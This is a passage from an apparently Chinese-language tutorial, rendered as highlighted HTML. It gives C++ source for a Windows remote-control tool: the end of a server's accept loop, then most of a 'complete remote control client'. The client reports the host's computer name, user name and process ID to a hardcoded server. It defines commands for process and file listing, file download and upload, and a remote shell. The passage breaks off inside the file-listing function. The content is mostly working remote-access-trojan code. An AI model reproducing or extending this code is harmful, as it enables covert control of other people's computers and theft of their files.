+<span class="line"><span style="color:#B392F0">    std</span><span style="color:#E1E4E8">::thread </span><span style="color:#B392F0">acceptThread</span><span style="color:#E1E4E8">([</span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">]() {</span></span>
+<span class="line"><span style="color:#F97583">        while</span><span style="color:#E1E4E8"> (g_serverRunning) {</span></span>
+<span class="line"><span style="color:#E1E4E8">            sockaddr_in clientAddr;</span></span>
+<span class="line"><span style="color:#F97583">            int</span><span style="color:#E1E4E8"> addrLen </span><span style="color:#F97583">=</span><span style="color:#F97583"> sizeof</span><span style="color:#E1E4E8">(clientAddr);</span></span>
+<span class="line"><span style="color:#E1E4E8">            </span></span>
+<span class="line"><span style="color:#E1E4E8">            SOCKET clientSock </span><span style="color:#F97583">=</span><span style="color:#B392F0"> accept</span><span style="color:#E1E4E8">(listenSock, (sockaddr</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">clientAddr, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">addrLen);</span></span>
+<span class="line"><span style="color:#F97583">            if</span><span style="color:#E1E4E8"> (clientSock </span><span style="color:#F97583">!=</span><span style="color:#E1E4E8"> INVALID_SOCKET) {</span></span>
+<span class="line"><span style="color:#B392F0">                std</span><span style="color:#E1E4E8">::</span><span style="color:#B392F0">thread</span><span style="color:#E1E4E8">(HandleClient, clientSock, clientAddr).</span><span style="color:#B392F0">detach</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#E1E4E8">            }</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">    });</span></span>
+<span class="line"><span style="color:#E1E4E8">    acceptThread.</span><span style="color:#B392F0">detach</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 命令行交互</span></span>
+<span class="line"><span style="color:#B392F0">    CommandLoop</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 清理</span></span>
+<span class="line"><span style="color:#E1E4E8">    g_serverRunning </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#B392F0">    closesocket</span><span style="color:#E1E4E8">(listenSock);</span></span>
+<span class="line"><span style="color:#B392F0">    WSACleanup</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[*] Server shutdown</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">    return</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span></code></pre><h3 id="section-8">2. 完整客户端程序</h3><pre class="shiki github-dark" style="background-color:#24292e;color:#e1e4e8" tabindex="0"><code><span class="line"><span style="color:#6A737D">// client_main.cpp</span></span>
+<span class="line"><span style="color:#6A737D">// 完整远程控制客户端</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;winsock2.h></span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;windows.h></span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;stdio.h></span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;string></span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;vector></span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;thread></span></span>
+<span class="line"><span style="color:#F97583">#include</span><span style="color:#9ECBFF"> &#x3C;tlhelp32.h></span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">#pragma</span><span style="color:#B392F0"> comment</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">lib</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"ws2_32.lib"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> MAGIC_NUMBER</span><span style="color:#F97583">    0x</span><span style="color:#79B8FF">52415400</span></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> SERVER_IP</span><span style="color:#9ECBFF">       "127.0.0.1"</span></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> SERVER_PORT</span><span style="color:#79B8FF">     8888</span></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> HEARTBEAT_INTERVAL</span><span style="color:#79B8FF">  30000</span><span style="color:#6A737D">  // 30秒</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">#pragma</span><span style="color:#B392F0"> pack</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">push</span><span style="color:#E1E4E8">, 1)</span></span>
+<span class="line"><span style="color:#F97583">typedef</span><span style="color:#F97583"> struct</span><span style="color:#B392F0"> _MSG_HEADER</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#E1E4E8">    DWORD magic;</span></span>
+<span class="line"><span style="color:#E1E4E8">    DWORD cmdType;</span></span>
+<span class="line"><span style="color:#E1E4E8">    DWORD dataLen;</span></span>
+<span class="line"><span style="color:#E1E4E8">    DWORD clientId;</span></span>
+<span class="line"><span style="color:#E1E4E8">} </span><span style="color:#B392F0">MSG_HEADER</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">typedef</span><span style="color:#F97583"> struct</span><span style="color:#B392F0"> _ONLINE_INFO</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#F97583">    char</span><span style="color:#E1E4E8"> computerName[</span><span style="color:#79B8FF">64</span><span style="color:#E1E4E8">];</span></span>
+<span class="line"><span style="color:#F97583">    char</span><span style="color:#E1E4E8"> userName[</span><span style="color:#79B8FF">64</span><span style="color:#E1E4E8">];</span></span>
+<span class="line"><span style="color:#F97583">    char</span><span style="color:#E1E4E8"> osVersion[</span><span style="color:#79B8FF">128</span><span style="color:#E1E4E8">];</span></span>
+<span class="line"><span style="color:#F97583">    char</span><span style="color:#E1E4E8"> ip[</span><span style="color:#79B8FF">32</span><span style="color:#E1E4E8">];</span></span>
+<span class="line"><span style="color:#E1E4E8">    DWORD processId;</span></span>
+<span class="line"><span style="color:#E1E4E8">} </span><span style="color:#B392F0">ONLINE_INFO</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#F97583">#pragma</span><span style="color:#B392F0"> pack</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">pop</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// 命令类型</span></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> CMD_ONLINE</span><span style="color:#F97583">      0x</span><span style="color:#79B8FF">0001</span></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> CMD_HEARTBEAT</span><span style="color:#F97583">   0x</span><span style="color:#79B8FF">0002</span></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> CMD_SYSINFO</span><span style="color:#F97583">     0x</span><span style="color:#79B8FF">0003</span></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> CMD_PROCLIST</span><span style="color:#F97583">    0x</span><span style="color:#79B8FF">0004</span></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> CMD_FILELIST</span><span style="color:#F97583">    0x</span><span style="color:#79B8FF">0005</span></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> CMD_DOWNLOAD</span><span style="color:#F97583">    0x</span><span style="color:#79B8FF">0006</span></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> CMD_UPLOAD</span><span style="color:#F97583">      0x</span><span style="color:#79B8FF">0007</span></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> CMD_SHELL</span><span style="color:#F97583">       0x</span><span style="color:#79B8FF">0008</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> CMD_SHELL_EXECUTE</span><span style="color:#F97583">    0x</span><span style="color:#79B8FF">3001</span></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> CMD_SHELL_OUTPUT</span><span style="color:#F97583">     0x</span><span style="color:#79B8FF">3002</span></span>
+<span class="line"><span style="color:#F97583">#define</span><span style="color:#B392F0"> CMD_SHELL_COMPLETE</span><span style="color:#F97583">   0x</span><span style="color:#79B8FF">3003</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">SOCKET g_sock </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> INVALID_SOCKET;</span></span>
+<span class="line"><span style="color:#E1E4E8">DWORD g_clientId </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// 发送响应</span></span>
+<span class="line"><span style="color:#F97583">bool</span><span style="color:#B392F0"> SendResponse</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">DWORD</span><span style="color:#FFAB70"> cmdType</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">const</span><span style="color:#F97583"> void*</span><span style="color:#FFAB70"> data</span><span style="color:#E1E4E8">, </span><span style="color:#B392F0">DWORD</span><span style="color:#FFAB70"> dataLen</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#E1E4E8">    MSG_HEADER header;</span></span>
+<span class="line"><span style="color:#E1E4E8">    header.magic </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> MAGIC_NUMBER;</span></span>
+<span class="line"><span style="color:#E1E4E8">    header.cmdType </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> cmdType;</span></span>
+<span class="line"><span style="color:#E1E4E8">    header.dataLen </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> dataLen;</span></span>
+<span class="line"><span style="color:#E1E4E8">    header.clientId </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> g_clientId;</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">send</span><span style="color:#E1E4E8">(g_sock, (</span><span style="color:#F97583">char*</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">header, </span><span style="color:#F97583">sizeof</span><span style="color:#E1E4E8">(header), </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">&#x3C;=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (dataLen </span><span style="color:#F97583">></span><span style="color:#79B8FF"> 0</span><span style="color:#F97583"> &#x26;&#x26;</span><span style="color:#E1E4E8"> data) {</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">send</span><span style="color:#E1E4E8">(g_sock, (</span><span style="color:#F97583">char*</span><span style="color:#E1E4E8">)data, dataLen, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">&#x3C;=</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#F97583">    return</span><span style="color:#79B8FF"> true</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// 收集上线信息</span></span>
+<span class="line"><span style="color:#F97583">void</span><span style="color:#B392F0"> GetOnlineInfo</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">PONLINE_INFO</span><span style="color:#FFAB70"> info</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#B392F0">    memset</span><span style="color:#E1E4E8">(info, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">sizeof</span><span style="color:#E1E4E8">(ONLINE_INFO));</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#E1E4E8">    DWORD size </span><span style="color:#F97583">=</span><span style="color:#F97583"> sizeof</span><span style="color:#E1E4E8">(info->computerName);</span></span>
+<span class="line"><span style="color:#B392F0">    GetComputerNameA</span><span style="color:#E1E4E8">(info->computerName, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">size);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#E1E4E8">    size </span><span style="color:#F97583">=</span><span style="color:#F97583"> sizeof</span><span style="color:#E1E4E8">(info->userName);</span></span>
+<span class="line"><span style="color:#B392F0">    GetUserNameA</span><span style="color:#E1E4E8">(info->userName, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">size);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#B392F0">    strcpy_s</span><span style="color:#E1E4E8">(info->osVersion, </span><span style="color:#9ECBFF">"Windows"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    info->processId </span><span style="color:#F97583">=</span><span style="color:#B392F0"> GetCurrentProcessId</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// 获取系统信息</span></span>
+<span class="line"><span style="color:#B392F0">std</span><span style="color:#E1E4E8">::</span><span style="color:#B392F0">string</span><span style="color:#B392F0"> GetSystemInfo</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#B392F0">    std</span><span style="color:#E1E4E8">::string result;</span></span>
+<span class="line"><span style="color:#F97583">    char</span><span style="color:#E1E4E8"> buf[</span><span style="color:#79B8FF">1024</span><span style="color:#E1E4E8">];</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 计算机名</span></span>
+<span class="line"><span style="color:#F97583">    char</span><span style="color:#E1E4E8"> computerName[</span><span style="color:#79B8FF">64</span><span style="color:#E1E4E8">];</span></span>
+<span class="line"><span style="color:#E1E4E8">    DWORD size </span><span style="color:#F97583">=</span><span style="color:#F97583"> sizeof</span><span style="color:#E1E4E8">(computerName);</span></span>
+<span class="line"><span style="color:#B392F0">    GetComputerNameA</span><span style="color:#E1E4E8">(computerName, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">size);</span></span>
+<span class="line"><span style="color:#B392F0">    sprintf_s</span><span style="color:#E1E4E8">(buf, </span><span style="color:#9ECBFF">"Computer: </span><span style="color:#79B8FF">%s\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, computerName);</span></span>
+<span class="line"><span style="color:#E1E4E8">    result </span><span style="color:#F97583">+=</span><span style="color:#E1E4E8"> buf;</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 用户名</span></span>
+<span class="line"><span style="color:#F97583">    char</span><span style="color:#E1E4E8"> userName[</span><span style="color:#79B8FF">64</span><span style="color:#E1E4E8">];</span></span>
+<span class="line"><span style="color:#E1E4E8">    size </span><span style="color:#F97583">=</span><span style="color:#F97583"> sizeof</span><span style="color:#E1E4E8">(userName);</span></span>
+<span class="line"><span style="color:#B392F0">    GetUserNameA</span><span style="color:#E1E4E8">(userName, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">size);</span></span>
+<span class="line"><span style="color:#B392F0">    sprintf_s</span><span style="color:#E1E4E8">(buf, </span><span style="color:#9ECBFF">"User: </span><span style="color:#79B8FF">%s\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, userName);</span></span>
+<span class="line"><span style="color:#E1E4E8">    result </span><span style="color:#F97583">+=</span><span style="color:#E1E4E8"> buf;</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 系统信息</span></span>
+<span class="line"><span style="color:#E1E4E8">    SYSTEM_INFO si;</span></span>
+<span class="line"><span style="color:#B392F0">    GetSystemInfo</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">si);</span></span>
+<span class="line"><span style="color:#B392F0">    sprintf_s</span><span style="color:#E1E4E8">(buf, </span><span style="color:#9ECBFF">"Processors: </span><span style="color:#79B8FF">%lu\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, si.dwNumberOfProcessors);</span></span>
+<span class="line"><span style="color:#E1E4E8">    result </span><span style="color:#F97583">+=</span><span style="color:#E1E4E8"> buf;</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 内存</span></span>
+<span class="line"><span style="color:#E1E4E8">    MEMORYSTATUSEX ms;</span></span>
+<span class="line"><span style="color:#E1E4E8">    ms.dwLength </span><span style="color:#F97583">=</span><span style="color:#F97583"> sizeof</span><span style="color:#E1E4E8">(ms);</span></span>
+<span class="line"><span style="color:#B392F0">    GlobalMemoryStatusEx</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">ms);</span></span>
+<span class="line"><span style="color:#B392F0">    sprintf_s</span><span style="color:#E1E4E8">(buf, </span><span style="color:#9ECBFF">"Memory: </span><span style="color:#79B8FF">%llu</span><span style="color:#9ECBFF"> MB</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, ms.ullTotalPhys </span><span style="color:#F97583">/</span><span style="color:#79B8FF"> 1024</span><span style="color:#F97583"> /</span><span style="color:#79B8FF"> 1024</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    result </span><span style="color:#F97583">+=</span><span style="color:#E1E4E8"> buf;</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    return</span><span style="color:#E1E4E8"> result;</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// 枚举进程</span></span>
+<span class="line"><span style="color:#B392F0">std</span><span style="color:#E1E4E8">::</span><span style="color:#B392F0">string</span><span style="color:#B392F0"> GetProcessList</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#B392F0">    std</span><span style="color:#E1E4E8">::string result;</span></span>
+<span class="line"><span style="color:#F97583">    char</span><span style="color:#E1E4E8"> buf[</span><span style="color:#79B8FF">1024</span><span style="color:#E1E4E8">];</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#E1E4E8">    HANDLE hSnapshot </span><span style="color:#F97583">=</span><span style="color:#B392F0"> CreateToolhelp32Snapshot</span><span style="color:#E1E4E8">(TH32CS_SNAPPROCESS, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (hSnapshot </span><span style="color:#F97583">==</span><span style="color:#E1E4E8"> INVALID_HANDLE_VALUE) {</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#9ECBFF"> "Failed to create snapshot</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#E1E4E8">    PROCESSENTRY32 pe </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> { </span><span style="color:#F97583">sizeof</span><span style="color:#E1E4E8">(PROCESSENTRY32) };</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">Process32First</span><span style="color:#E1E4E8">(hSnapshot, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">pe)) {</span></span>
+<span class="line"><span style="color:#B392F0">        sprintf_s</span><span style="color:#E1E4E8">(buf, </span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">%-8s</span><span style="color:#79B8FF"> %-20s</span><span style="color:#79B8FF"> %s\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"PID"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"Name"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"Path"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">        result </span><span style="color:#F97583">+=</span><span style="color:#E1E4E8"> buf;</span></span>
+<span class="line"><span style="color:#B392F0">        sprintf_s</span><span style="color:#E1E4E8">(buf, </span><span style="color:#9ECBFF">"----------------------------------------</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">        result </span><span style="color:#F97583">+=</span><span style="color:#E1E4E8"> buf;</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        do</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#B392F0">            sprintf_s</span><span style="color:#E1E4E8">(buf, </span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">%-8lu</span><span style="color:#79B8FF"> %-20s</span><span style="color:#79B8FF"> %s\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#E1E4E8">                pe.th32ProcessID,</span></span>
+<span class="line"><span style="color:#E1E4E8">                pe.szExeFile,</span></span>
+<span class="line"><span style="color:#9ECBFF">                ""</span><span style="color:#E1E4E8">);</span><span style="color:#6A737D">  // 简化，实际可以获取完整路径</span></span>
+<span class="line"><span style="color:#E1E4E8">            result </span><span style="color:#F97583">+=</span><span style="color:#E1E4E8"> buf;</span></span>
+<span class="line"><span style="color:#E1E4E8">        } </span><span style="color:#F97583">while</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">Process32Next</span><span style="color:#E1E4E8">(hSnapshot, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">pe));</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#B392F0">    CloseHandle</span><span style="color:#E1E4E8">(hSnapshot);</span></span>
+<span class="line"><span style="color:#F97583">    return</span><span style="color:#E1E4E8"> result;</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// 枚举文件</span></span>
+<span class="line"><span style="color:#B392F0">std</span><span style="color:#E1E4E8">::</span><span style="color:#B392F0">string</span><span style="color:#B392F0"> GetFileList</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">const</span><span style="color:#B392F0"> std</span><span style="color:#E1E4E8">::</span><span style="color:#B392F0">string</span><span style="color:#F97583">&#x26;</span><span style="color:#FFAB70"> path</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#B392F0">    std</span><span style="color:#E1E4E8">::string result;</span></span>
+<span class="line"><span style="color:#F97583">    char</span><span style="color:#E1E4E8"> buf[</span><span style="color:#79B8FF">1024</span><span style="color:#E1E4E8">];</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#B392F0">    std</span><span style="color:#E1E4E8">::string searchPath </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> path;</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (searchPath.</span><span style="color:#B392F0">back</span><span style="color:#E1E4E8">() </span><span style="color:#F97583">!=</span><span style="color:#9ECBFF"> '</span><span style="color:#79B8FF">\\</span><span style="color:#9ECBFF">'</span><span style="color:#F97583"> &#x26;&#x26;</span><span style="color:#E1E4E8"> searchPath.</span><span style="color:#B392F0">back</span><span style="color:#E1E4E8">() </span><span style="color:#F97583">!=</span><span style="color:#9ECBFF"> '/'</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#E1E4E8">        searchPath </span><span style="color:#F97583">+=</span><span style="color:#9ECBFF"> "</span><span style="color:#79B8FF">\\</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    searchPath </span><span style="color:#F97583">+=</span><span style="color:#9ECBFF"> "*"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#E1E4E8">    WIN32_FIND_DATAA findData;</span></span>
+<span class="line"><span style="color:#E1E4E8">    HANDLE hFind </span><span style="color:#F97583">=</span><span style="color:#B392F0"> FindFirstFileA</span><span style="color:#E1E4E8">(searchPath.</span><span style="color:#B392F0">c_str</span><span style="color:#E1E4E8">(), </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">findData);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (hFind </span><span style="color:#F97583">==</span><span style="color:#E1E4E8"> INVALID_HANDLE_VALUE) {</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#9ECBFF"> "Failed to list directory</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#B392F0">    sprintf_s</span><span style="color:#E1E4E8">(buf, </span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">%-15s</span><span style="color:#79B8FF"> %-10s</span><span style="color:#79B8FF"> %s\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"Attributes"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"Size"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"Name"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    result </span><span style="color:#F97583">+=</span><span style="color:#E1E4E8"> buf;</span></span>
+<span class="line"><span style="color:#B392F0">    sprintf_s</span><span style="color:#E1E4E8">(buf, </span><span style="color:#9ECBFF">"----------------------------------------</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    result </span><span style="color:#F97583">+=</span><span style="color:#E1E4E8"> buf;</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#F97583">    do</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">strcmp</span><span style="color:#E1E4E8">(findData.cFileName, </span><span style="color:#9ECBFF">"."</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">==</span><span style="color:#79B8FF"> 0</span><span style="color:#F97583"> ||</span><span style="color:#E1E4E8"> </span></span>
+<span class="line"><span style="color:#B392F0">            strcmp</span><span style="color:#E1E4E8">(findData.cFileName, </span><span style="color:#9ECBFF">".."</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">==</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#F97583">            continue</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#E1E4E8">        ULONGLONG size </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> ((ULONGLONG)findData.nFileSizeHigh </span><span style="color:#F97583">&#x3C;&#x3C;</span><span style="color:#79B8FF"> 32</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">|</span><span style="color:#E1E4E8"> findData.nFileSizeLow;</span></span>
+<span class="line"><span style="color:#F97583">        const</span><span style="color:#F97583"> char*</span><span style="color:#E1E4E8"> sizeStr </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (findData.dwFileAttributes </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8"> FILE_ATTRIBUTE_DIRECTORY) </span><span style="color:#F97583">?</span><span style="color:#E1E4E8"> </span></span>
+<span class="line"><span style="color:#9ECBFF">                             "&#x3C;DIR>"</span><span style="color:#F97583"> :</span><span style="color:#B392F0"> std</span><span style="color:#E1E4E8">::</span><span style="color:#B392F0">to_string</span><span style="color:#E1E4E8">(size).</span><span style="color:#B392F0">c_str</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
